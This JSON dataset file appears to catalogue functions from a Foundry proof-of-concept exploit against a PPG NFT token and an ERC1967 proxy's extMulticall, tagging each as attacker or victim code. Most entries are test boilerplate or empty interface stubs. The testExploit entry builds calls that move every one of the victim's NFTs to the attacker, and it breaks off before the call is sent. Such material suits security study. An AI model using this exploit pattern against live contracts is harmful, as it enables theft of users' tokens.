[
  {
    "contract/interface": "IERC1967Proxy",
    "source_type": "victim_contract",
    "function_name": "extMulticall",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_802_287);\n        vm.label(address(PPG), \"PPG\");\n        vm.label(address(ERC1967Proxy), \"ERC1967Proxy\");\n        vm.label(victim, \"victim\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_uint(\"Victim PPG token balance before attack\", PPG.balanceOf(victim));\n        emit log_named_uint(\"Attacker PPG token balance before attack\", PPG.balanceOf(address(this)));\n\n        IERC1967Proxy.CallData[] memory calls = new IERC1967Proxy.CallData[](PPG.balanceOf(victim));\n\n        for (uint256 i; i < PPG.balanceOf(victim); ++i) {\n            uint256 id = PPG.tokenOfOwnerByIndex(victim, i);\n            bytes memory data =\n                abi.encodeWithSignature(\"safeTransferFrom(address,address,uint256)\", victim, address(this), id);\n            IERC1967Proxy.CallData memory callData = IERC1967Proxy.CallData({target: address(PPG), callData: data});\n            calls[i] = callData;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "getApproved",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "isApprovedForAll",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "ownerOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "safeTransferFrom",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "setApprovalForAll",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "tokenOfOwnerByIndex",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPPGToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "",
    "description": ""
  }
]